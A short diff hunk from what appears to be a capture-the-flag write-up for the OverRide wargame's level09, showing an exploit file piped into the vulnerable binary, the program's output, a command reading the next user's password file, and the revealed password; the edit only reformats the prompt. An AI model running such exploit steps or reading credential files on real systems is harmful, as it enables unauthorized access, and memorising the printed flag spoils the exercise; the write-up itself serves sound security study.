@@ -135,6 +135,6 @@ level09@OverRide:~$ cat /tmp/exploit - | ./level09
 >: Enter your username
 >>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>: Msg @Unix-Dude
 >>: >: Msg sent!
-cat /home/users/end/.pass
+% cat /home/users/end/.pass
 j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
 ```
